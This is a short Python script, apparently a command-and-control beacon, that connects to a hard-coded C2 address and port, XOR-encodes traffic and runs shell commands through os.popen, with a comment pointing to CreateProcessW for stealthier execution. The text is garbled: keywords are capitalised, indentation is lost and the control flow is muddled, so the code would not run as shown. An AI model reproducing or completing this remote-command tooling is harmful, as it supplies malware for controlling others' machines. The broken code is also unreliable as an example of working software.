Import socket
Import base64
Import time
Import os


C2_IP = "10.211.55.5"
C2_PORT = 4444
XOR_KEY = 0x42


Def xor_cipher(data):
Return bytes([b ^ XOR_KEY for b in data])


Def execute_in_memory(cmd):
    """
    This is a simplified interface to demonstrate the concept.
    For advanced usage, use ctypes to call CreateProcessW directly.
    """
   
    Return os.popen(cmd).read()


Def beacon():
Try:
S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
S.connect((C2_IP, C2_PORT))
While True:
Cmd = input("Command> ")
Cmd = xor_cipher(cmd.encode())
S.send(Cmd)
Data = s.recv(4096)
Response = xor_cipher(Data).decode()
Print(response)
Except Exception as e:
       
Time.sleep(60)
Continue
If __name__ == "__main__":
    
Os.system("cls")
Beacon()
